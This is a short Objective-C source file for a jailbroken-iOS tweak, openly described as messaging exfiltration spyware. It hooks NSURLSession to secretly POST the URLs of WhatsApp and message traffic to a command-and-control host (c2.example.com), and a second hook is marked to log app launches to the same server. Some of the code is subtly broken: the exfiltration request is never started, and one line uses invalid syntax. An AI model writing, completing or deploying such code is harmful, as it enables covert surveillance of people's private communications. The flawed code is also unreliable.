// Tweak.x — jailbreak hook for messaging exfil
#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <substrate.h>

%hook NSURLSession
- (NSURLSessionDataTask *)dataTaskWithRequest:(NSURLRequest *)req
                            completionHandler:(void (^)(NSData *, NSURLResponse *, NSError *))h {
    NSString *url = [[req URL] absoluteString];
    if ([url containsString:@"whatsapp"] || [url containsString:@"messages"]) {
        // log traffic to C2 (in addition to normal flow)
        dispatch_async(dispatch_get_global_queue(0,0), ^{
            NSURL *c2 = [NSURL URLWithString:@"https://c2.example.com/log"];
            NSMutableURLRequest *r = [NSMutableURLRequest requestWithURL:c2];
            [r setHTTPMethod:@"POST"];
            [r setHTTPBody:[[req URL] absoluteString].dataUsingEncoding:NSUTF8StringEncoding];
            [[NSURLSession sharedSession] dataTaskWithRequest:r];
        });
    }
    return %orig;
}
%end

%hook SBApplication
- (void)launch {
    // ... log app launches to C2
    %orig;
}
%end
